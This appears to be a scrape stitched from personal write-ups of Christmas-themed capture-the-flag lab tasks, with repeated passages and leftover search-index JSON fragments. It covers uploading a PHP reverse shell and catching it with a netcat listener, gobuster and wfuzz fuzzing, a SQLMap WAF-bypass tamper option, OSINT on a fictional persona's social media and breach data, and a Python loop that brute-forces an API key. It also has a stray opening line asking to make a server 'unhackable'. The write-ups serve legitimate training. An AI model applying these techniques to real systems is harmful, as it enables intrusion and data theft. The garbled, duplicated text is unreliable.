Please perform a security audit on the new server and make sure it's unhackable! Additional Info to Note Putting it all together This was a lot of information, so let's put it all together and look at the full process for exploiting a file upload vulnerability in a PHP web application: Find a file upload point. Try uploading some innocent files -- what does it accept? (Images, text files, PDFs, etc) Find the directory containing your uploads. Try to bypass any filters and upload a reverse shell. Start a netcat listener to receive the shell Navigate to the shell in your browser and receive a connection!

You're going to learn how to use Gobuster to enumerate a web server for hidden files and folders to aid in the recovery of Elf's forums. Later on, you're going to be introduced to an important technique that is fuzzing, where you will have the opportunity to put theory into practice. Our malicious, despicable, vile, cruel, contemptuous, evil hacker has defaced Elf's forums and completely removed the login page! However, we may still have access to the API. The sysadmin also told us that the API creates logs using dates with a format of YYYYMMDD. Additional Info to Note How to approach the challenge Since we know there's theoretically an API directory we can use gobuster to enumerate the website and see if we can find anything. Then assuming we do find something, we should investigate it for interesting files. Let's say we then find what seems to hold the logs, we know we're searching by date, so we can infer that there's a good chance that we'll be using the date parameter to interact with the API. We also know that the API takes a date in the form of YYYYMMDD. A wordlist in that format can be found in the hint for this task, although if you want an extra challenge, you can try and build a wordlist in that format yourself. Finally, API's may not return data if the proper parameters aren't passed, so with that knowledge, we can use the options in wfuzz to filter out parameters that don't return anything. With all that in mind, we should be able to get a flag. Tasks 1. Provide a wfuzz command `[ * , . :// *. / . * ****] Given the URL \"http://shibes.xyz/api.php\", what would the entire wfuzz command look like to query the \"breed\" parameter using the wordlist \"big.txt\" (assume that \"big.txt\" is in your current directory) I followed the example and used what was learned about get examples in a previous day.

After doing so, they were able to dump the whole gift list database, getting all the 2020 gifts in their hands. An attacker has threatened to publish a wishlist.txt file, containing all information, but happily, for us, he was caught by the CBI (Christmas Bureau of Investigation) before that. On MACHINE_IP:8000 you'll find the copy of the website and your goal is to replicate the attacker's actions by dumping the gift list! Additional Info to Note Challenge Visit the vulnerable application in Firefox, find Santa's secret login panel and bypass the login. Use some of the commands and tools covered throughout today's task to answer Questions #3 to #6. Santa reads some documentation that he wrote when setting up the application, it reads: Santa's TODO: Look at alternative database systems that are better than sqlite. Also, don't forget that you installed a Web Application Firewall (WAF) after last year's attack. In case you've forgotten the command, you can tell SQLMap to try and bypass the WAF by using --tamper=space2comment Tasks 1. Without using directory brute forcing, what's Santa's secret login panel?

A user's posting history can possibly lead to further information. Sometimes, it's the smallest of clues that help us out. Comb through Rudolph's Reddit history and answer questions #1-5 below. You may need to use partial clues with a search engine to fill in the gaps. 1. What URL will take me directly to Rudolph's Reddit comment history? So we know he has a reddit account, so we can just go straight to that profile on http://reddit.com/u/IGuidetheClaus2020. Then navigate to \"Comments\" Answer = https://www.reddit.com/user/IGuidetheClaus2020/comments/ 2. According to Rudolph, where was he born? One of his comments reads: Fun fact: I was actually born in Chicago and my creator's name was Robert! Answer = Chicago 3. Rudolph mentions Robert. Can you use Google to tell me Robert's last name? Doing a Google search of \"robert chicago rudolph\" immediately have Robert L. May's wiki page. Answer = May 4. On what other social media platform might Rudolph have an account? Another comment on the Reddit profile: Ouch. Some days I love Twitter. Some days, it's just...lol. Answer = Twitter 5. What is Rudolph's username on that platform? I done a quick search on twitter for IGuidetheClaus2020 which was named that, but it had the handle @IGuideClaus2020 Answer = IGuidetheClaus2020 Task 2 Well it looks like you have uncovered Rudolph's Twitter Now we can read into all of his chitter Go through his profile and give it some views The deeper you dig, the better the clues By finding another account belonging to our user, we open up the possibility of gathering even more information. Utilize the information found on Rudolph's Twitter account to answer questions #6-11. 6. What appears to be Rudolph's favorite TV show right now? Answer = Bachelorette 7. Based on Rudolph's post history, he took part in a parade. Where did the parade take place? Looking at the photos on the twitter page, one of the banners a person was holding said \"Thompson Coburn LLP\". A quick google search states they are based in Chicago Answer = Chicago 8. Okay, you found the city, but where specifically was one of the photos taken? Unfortunately this one didn't go too well. I guessed correctly to check the exif data of the higher res image (external to twitter, so it would retain that data), and sure enough I was able to extracj it using exiftool . This gave me the coordinates as 41 deg 53' 30.53\" N, 87 deg 37' 27.40\" W which I knew wasn't the format that the answer wanted so I went about looking for an online converter.

I uploaded the file and got slightly different decimals, so I tried those instead and it worked. Answer = 41.891815, -87.624277 9. Did you find a flag too? The flag was in the exif data under copyright. Answer = {FLAG}ALWAYSCHECKTHEEXIFD4T4 10. Has Rudolph been pwned? What password of his appeared in a breach? I had a look his twitter profile and it contained a bussiness email address. I ran this through http://HaveIBeenPwned.com, and sure enough it was part of the LiveJournal breach. This took forever!

Where's Santa? Intro Oh no! Santa \ud83c\udf85 has taken off, leaving you -- the faithful elves behind! Can you help find Santa's location? Luckily, the elves are OSINT masters and remember a thing or two. Specifically, they remember: Santa has a webpage at MACHINE_IP/static/index.html to help lost elves find their way home. Santa never told the elves what port number the webserver is on. Can you find out?! This webpage has a link somewhere on it, hidden away so anyone that isn't an elf can't find it. Santa's Sled has an API we can talk too. The key for the API is between 0 and 100, and it's an odd number. But be careful! After an unknown number of attempts, Santa's Sled will ban your IP address. Using your Python skills from Day 15 to find the correct key for the API. Tasks 1. What is the port number for the web server? [**] This one was quite obvious. I went with port 80 as it is quite a common one, so I did a quick nmap scan on the server with ports 1-100. (we also know the port number is at most 99 due to only 2 digits) 1 2 3 PORT STATE SERVICE 22/tcp open ssh 80/tcp open http I then went to 10.10.***.***:80 in the browser and it took me to the webpage. Answer = 80 2. Without using enumerations tools such as Dirbuster, what is the directory for the API? (without the API key) [/***/] The webpage and the intro claims that there is a link hidden. Honestly I just moused over all of the links until it changed. The odd link out directs to http://machine_ip/api/api_key I wanted to also try doing it the Python way so I went about doing that. Unfortunately on Windows it was a bit of a pain (I think I messed up the install directories/PATH) so I moved over to my Manjaro machine. The original code didn't really seem to work, so I watched the video again and saw the process of whittling down the errors and followed suit. Eventually I had the script working and it printed out (script in AdditionalFiles): 1 2 3 4 5 6 7 ... # # http://machine_ip/api/api_key # # ... Answer = /api/ 3. Where is Santa right now? [****** **********, **** ****, ******] Okay this stumpped me for a while. The reason being, at the time this challenge was going on, 3 & 4 were in a different order. I found this out by looking at the video provided, then stopped there so not to cheat my way through. BAck to this one! When I ran my script, the answer was printed out among the failed attempts. Answer = Winter Wonderland, Hyde Park, London 4. Find out the correct API key. Remember, this is an odd number between 0-100. After too many attempts, Santa's Sled will block you. [**] So with this I decided to white another script in python to run through the keys. As we know it is an odd number, there will only be 50 possible keys. The script I came up with is below: 1 2 3 4 5 6 7 8 import requests api_key = 1 while api_key < 100 : html = requests . get ( f 'http://10.10.***.***:80/api/ { api_key } ' ) print ( html . text ) # print(api_key) Debugging api_key += 2 # It's not just +, as I found out by going over the requests limit; had to re-deploy I then got a hit!

Using your Python skills from Day 15 to find the correct key for the API.","title":"Intro"},{"location":"Day_16/#tasks","text":"","title":"Tasks"},{"location":"Day_16/#1-what-is-the-port-number-for-the-web-server","text":"This one was quite obvious. I went with port 80 as it is quite a common one, so I did a quick nmap scan on the server with ports 1-100.

Honestly I just moused over all of the links until it changed. The odd link out directs to http://machine_ip/api/api_key I wanted to also try doing it the Python way so I went about doing that. Unfortunately on Windows it was a bit of a pain (I think I messed up the install directories/PATH) so I moved over to my Manjaro machine. The original code didn't really seem to work, so I watched the video again and saw the process of whittling down the errors and followed suit. Eventually I had the script working and it printed out (script in AdditionalFiles): 1 2 3 4 5 6 7 ... # # http://machine_ip/api/api_key # # ... Answer = /api/","title":"2.
